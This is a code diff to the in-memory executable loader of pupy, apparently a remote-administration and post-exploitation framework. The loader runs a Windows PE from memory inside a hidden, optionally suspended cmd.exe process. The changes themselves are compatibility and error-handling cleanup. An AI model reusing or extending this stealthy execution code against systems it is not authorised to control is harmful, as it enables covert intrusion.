@@ -34,6 +34,7 @@ from __future__ import absolute_import
 from __future__ import division
 from __future__ import print_function
 from __future__ import unicode_literals
+
 import ctypes
 import threading
 
@@ -42,6 +43,7 @@ from ctypes import byref, create_string_buffer, POINTER, WinError
 
 from pupy import is_supported, mexec
 from network.lib.pupyrpc import nowait
+from network.lib.convcompat import as_native_string
 
 if not is_supported(mexec):
     import pupymemexec
@@ -85,13 +87,20 @@ PIPE_NOWAIT = 0x1
 class MemoryPE(object):
     ''' run a pe from memory. '''
 
-    def __init__(self, raw_pe, args=[], suspended_process=None, hidden=True, dupHandle=None):
+    def __init__(
+        self, raw_pe, args=[], suspended_process=None,
+            hidden=True, dupHandle=None):
+
         self.cmdline = suspended_process or 'cmd.exe'
 
         if args:
-            self.cmdline += ' '+' '.join(args)
+            self.cmdline += ' ' + ' '.join(args)
 
         self.raw_pe = raw_pe
+
+        if not isinstance(self.raw_pe, bytes):
+            self.raw_pe = bytes(self.raw_pe)
+
         self.suspended_process = suspended_process
 
         self.hidden = hidden
@@ -152,7 +161,9 @@ class MemoryPE(object):
                 self.hidden, self.dupHandle
             )
         except Exception as e:
-            self.write_cb('[!] memexec failed: {}\n'.format(e))
+            if self.write_cb:
+                self.write_cb('[!] memexec failed: {}\n'.format(e))
+
             return False
 
         self.pStdout = HANDLE(pStdout)
@@ -188,7 +199,7 @@ class MemoryPE(object):
                         break
 
                 if c_read.value > 0:
-                    buffer[c_read.value] = '\x00'
+                    buffer[c_read.value] = b'\x00'
 
                     if self.write_cb:
                         try:
@@ -200,9 +211,14 @@ class MemoryPE(object):
                         self.stdout += buffer.value
 
         except Exception as e:
+            import traceback
             if self.write_cb:
                 try:
-                    self.write_cb('[+] Exception: {}'.format(e))
+                    self.write_cb(
+                        '[+] Exception: {}'.format(
+                            traceback.format_exc()
+                        )
+                    )
                 except:
                     pass
 
